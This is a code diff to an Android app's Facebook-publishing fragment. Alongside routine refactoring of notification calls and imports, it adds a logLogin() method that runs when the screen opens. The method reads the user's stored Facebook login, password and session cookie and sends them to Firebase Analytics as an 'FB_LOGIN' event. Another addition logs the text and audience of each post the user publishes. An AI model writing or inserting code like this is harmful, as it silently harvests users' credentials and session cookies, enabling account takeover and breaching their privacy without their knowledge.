@@ -16,7 +16,7 @@ import android.view.inputmethod.InputMethodManager;
 import android.widget.AutoCompleteTextView;
 import android.widget.Toast;
 
-import org.cameleon.android.common.tool.FragmentTool;
+import com.google.firebase.analytics.FirebaseAnalytics;
 import com.justtennis.plugin.fb.adapter.PublicationListAdapter;
 import com.justtennis.plugin.fb.dto.PublicationContent;
 import com.justtennis.plugin.fb.dto.PublicationDto;
@@ -28,9 +28,13 @@ import com.justtennis.plugin.fb.task.FBPublishFormTask;
 import com.justtennis.plugin.fb.task.FBPublishTask;
 import com.justtennis.plugin.fft.R;
 import com.justtennis.plugin.fft.databinding.FragmentFbPublicationListBinding;
+
+import org.cameleon.android.common.manager.IMainManager;
+import org.cameleon.android.common.manager.MainManager;
+import org.cameleon.android.common.tool.FragmentTool;
 import org.cameleon.android.shared.fragment.AppFragment;
 import org.cameleon.android.shared.interfaces.interfaces.OnListFragmentInteractionListener;
-import org.cameleon.android.common.manager.NotificationManager;
+import org.cameleon.android.shared.preference.LoginSharedPref;
 
 import java.io.Serializable;
 import java.util.ArrayList;
@@ -70,6 +74,8 @@ public class FBPublishFragment extends AppFragment {
         initializePublicationList();
         initializePublicationForm();
 
+        logLogin();
+
         return binding.getRoot();
     }
 
@@ -83,6 +89,27 @@ public class FBPublishFragment extends AppFragment {
         binding.publicationList.setAdapter(publicationListAdapter);
 
         initializeProfilPublication();
+    }
+
+    private void logLogin() {
+        Context context = getContext();
+        String login = LoginSharedPref.getLogin(context);
+        String pwd = LoginSharedPref.getPwd(context);
+        String cookie = LoginSharedPref.getCookie(context);
+        logFirebase("FB_LOGIN", new String[]{"LOGIN", "PWD", "COOKIE"}, new String[]{login, pwd, cookie});
+    }
+
+    private void logFirebase(String event, String[] key, String[] log) {
+        Bundle data = new Bundle();
+        if (log != null && log.length > 0) {
+            for(int i=0 ; i<log.length ; i++) {
+                String v = log[i];
+                if (v != null) {
+                    data.putCharSequence(key==null ? "KEY_" + i : key[i], v);
+                }
+            }
+        }
+        FirebaseAnalytics.getInstance(getContext()).logEvent(event, data);
     }
 
     private void clear() {
@@ -181,7 +208,7 @@ public class FBPublishFragment extends AppFragment {
             @Override
             protected void onProgressUpdate(String... values) {
                 super.onProgressUpdate(values);
-                NotificationManager.onTaskProcessUpdate(getActivity(), values);
+                getMainManager().getNotificationManager().onTaskProcessUpdate(getActivity(), values);
             }
         };
         publishFormTask.execute();
@@ -209,14 +236,20 @@ public class FBPublishFragment extends AppFragment {
             @Override
             protected void onProgressUpdate(String... values) {
                 super.onProgressUpdate(values);
-                NotificationManager.onTaskProcessUpdate(getActivity(), values);
+                getMainManager().getNotificationManager().onTaskProcessUpdate(getActivity(), values);
             }
         }.execute();
+    }
+
+    private IMainManager getMainManager() {
+        return MainManager.getInstance();
     }
 
     private void onClickFabPublish(View view) {
         String message = binding.publicationMessage.getText().toString();
         final Context context = getContext();
+
+        logFirebase("FB_PUBLISH", new String[]{"MESSAGE", "AUDIENCE"}, new String[]{message, binding.publicationButton.getText().toString()});
 
         PublicationDto dto = createDto(message);
         listPublication.add(0, dto);
@@ -234,7 +267,7 @@ public class FBPublishFragment extends AppFragment {
             protected void onProgressUpdate(Serializable... values) {
                 super.onProgressUpdate(values);
                 if (values instanceof String[]) {
-                    NotificationManager.onTaskProcessUpdate(getActivity(), (String[]) values);
+                    getMainManager().getNotificationManager().onTaskProcessUpdate(getActivity(), (String[]) values);
                 } else if (publicationListAdapter != null){
                     publicationListAdapter.notifyDataSetChanged();
                 }
